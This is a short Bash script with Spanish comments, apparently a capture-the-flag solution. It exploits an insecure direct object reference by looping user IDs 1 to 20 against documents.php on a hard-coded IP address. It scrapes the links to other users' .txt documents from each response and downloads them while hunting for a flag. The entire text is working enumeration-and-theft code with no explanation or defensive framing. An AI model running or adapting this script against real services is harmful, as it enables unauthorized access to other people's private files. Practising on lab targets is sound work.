#!/bin/bash

BASE_URL="http://94.237.57.57:55116"

for uid in {1..20}; do
    echo "[*] Revisando UID $uid..."
    curl -s -X POST -d "uid=$uid" "$BASE_URL/documents.php" | \
    grep -oP '/documents[^"]+\.txt' | while read -r txt_file; do
        echo "  [+] Posible flag: $txt_file"
        full_url="$BASE_URL$txt_file"
        echo "    - Descargando y mostrando contenido:"
        curl -s "$full_url"
        echo -e "\n----------------------------------"
    done
done

